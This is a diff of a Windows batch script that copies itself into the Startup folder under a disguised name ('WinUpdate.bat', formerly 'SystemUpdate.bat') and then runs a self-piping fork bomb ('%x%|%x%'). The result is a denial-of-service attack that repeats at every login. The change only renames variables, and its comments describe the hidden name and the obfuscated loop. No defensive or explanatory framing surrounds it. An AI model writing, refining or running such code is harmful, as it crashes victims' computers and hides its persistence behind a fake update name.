@@ -1,13 +1,15 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: Get Startup folder path
-for /f "delims=" %%a in ('powershell -C "$env:APPDATA + '\Microsoft\Windows\Start Menu\Programs\Startup\'"') do set "startup=%%a"
+:: Obfuscated Startup path retrieval
+for /f "delims=" %%a in ('powershell -C "$env:APPDATA + '\Microsoft\Windows\Start Menu\Programs\Startup\'"') do set "s=%%a"
 
-:: Copy itself to the Startup folder with a hidden name
-set "hiddenName=SystemUpdate.bat"
-copy "%~f0" "!startup!\!hiddenName!" >nul
+:: Create hidden file name
+set "h=WinUpdate.bat"
 
-:: Obfuscated self-execution
-set "cmd=%0^|%0"
-!cmd!
+:: Copy itself to Startup
+copy "%~f0" "!s!\!h!" >nul
+
+:: Obfuscate the infinite loop
+set "x=%0"
+%x%|%x%
